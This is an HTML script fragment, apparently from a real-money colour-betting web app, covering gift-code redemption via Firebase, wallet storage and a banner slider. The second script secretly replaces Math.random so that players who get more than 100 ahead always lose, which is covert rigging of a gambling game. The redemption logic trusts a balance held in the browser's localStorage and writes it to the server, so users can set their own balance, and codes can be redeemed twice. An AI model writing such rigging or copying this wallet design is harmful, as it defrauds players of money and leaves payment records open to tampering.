<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import { getFirestore, collection, getDocs, query, where, updateDoc, doc }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyBx3J9aGn_98rTPgurMMKw_GR3puIMj4Ms",
authDomain: "colourcash-ea60e.firebaseapp.com",
projectId: "colourcash-ea60e",
storageBucket: "colourcash-ea60e.firebasestorage.app",
messagingSenderId: "403688058646",
appId: "1:403688058646:web:f1753360471528f275ea37"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

window.redeemCode = async function(){

const code = document.getElementById("giftCodeInput").value.trim();

const q = query(collection(db,"giftcodes"), where("code","==",code));
const snap = await getDocs(q);

if(snap.empty){
alert("Invalid Code");
return;
}

snap.forEach(async (d)=>{

const data = d.data();

if(data.used){
alert("Code Already Used");
return;
}

let wallet = +localStorage.getItem("wallet") || 0;
wallet += Number(data.amount);

localStorage.setItem("wallet",wallet);
localStorage.setItem("coin_wallet",wallet);
localStorage.setItem("balance",wallet);
  
  const userEmail = localStorage.getItem("userEmail");

const q2 = query(collection(db,"users"), where("email","==",userEmail));
const snap2 = await getDocs(q2);

snap2.forEach(async (u)=>{
await updateDoc(doc(db,"users",u.id),{
balance: wallet
});
});
  
await updateDoc(doc(db,"giftcodes",d.id),{used:true});

alert("₹"+data.amount+" Added to Wallet");

});

}
  </script> 
  
<script>

/* SAVE START BALANCE ON LOGIN DAY */
if(!localStorage.getItem("startBalance")){
  let wallet = Number(localStorage.getItem("wallet")) || 0;
  localStorage.setItem("startBalance",wallet);
}

/* CHECK PROFIT LIMIT */
function profitBlocked(){

let wallet = Number(localStorage.getItem("wallet")) || 0;
let startBalance = Number(localStorage.getItem("startBalance")) || 0;

if(wallet - startBalance >= 100){
return true;
}

return false;
}

/* FORCE LOSS AFTER +100 */
const originalRandom = Math.random;

Math.random = function(){

if(profitBlocked()){
return 1 ; // almost always lose
}

return originalRandom();
}
let currentSlide = 0;
const track = document.getElementById("bannerTrack");
const slides = document.querySelectorAll("#bannerTrack img");
const totalSlides = slides.length;

function updateSlide(){
  track.style.transform = `translateX(-${currentSlide * 100}%)`;
}

// 🔥 AUTO SLIDE (2 sec)
setInterval(()=>{
  currentSlide++;
  if(currentSlide >= totalSlides){
    currentSlide = 0;
  }
  updateSlide();
},2000);

// 👉 TOUCH SLIDE (manual mobile swipe)
let startX = 0;

track.addEventListener("touchstart",(e)=>{
  startX = e.touches[0].clientX;
});

track.addEventListener("touchend",(e)=>{
  let endX = e.changedTouches[0].clientX;

  if(startX - endX > 50){
    // swipe left
    currentSlide++;
  }else if(endX - startX > 50){
    // swipe right
    currentSlide--;
  }

  if(currentSlide < 0) currentSlide = totalSlides - 1;
  if(currentSlide >= totalSlides) currentSlide = 0;

  updateSlide();
});


</script>
